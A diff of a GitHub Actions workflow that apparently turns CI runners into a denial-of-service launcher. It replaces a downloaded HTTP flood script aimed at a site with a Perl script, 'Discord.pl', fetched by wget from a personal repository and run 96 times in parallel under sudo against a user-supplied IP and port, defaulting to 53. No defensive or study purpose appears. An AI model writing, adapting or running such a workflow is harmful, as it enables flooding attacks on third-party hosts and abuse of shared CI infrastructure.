@@ -1,13 +1,17 @@
-name: RAW !
+name: Discord !
 
 on:
   workflow_dispatch:
     inputs:
       target:
-        description: "Site !"
+        description: "IP !"
         required: true
-        default: "http://127.0.0.1/"
-
+        default: "127.0.0.1"
+      port:
+        description: "Port !"
+        required: true
+        default: "53"
+      
 jobs:
   vds:
     runs-on: ubuntu-latest
@@ -23,21 +27,22 @@ jobs:
       - name: OK !
         run: |
           TARGET="${{ inputs.target }}"
-
-          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/HTTP-RAW.js -O RAW.js
-          chmod +x RAW.js || true
-
+          PORT="${{ inputs.port }}"
+          
+          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/Discord.pl -O Discord.pl
+          chmod +x Discord.pl || true
+          
           PIDS=()
-          for i in {1..16}; do
-            sudo timeout 45 node RAW.js "$TARGET" 45 &
+          for i in {1..96}; do
+            sudo timeout 30 perl Discord.pl "$TARGET" "$PORT" &
             PIDS+=($!)
           done
 
           for pid in "${PIDS[@]}"; do
             wait $pid
           done
-
+          
       - name: Finish !
         run: |
-          sleep 45
+          sleep 30
           exit 0
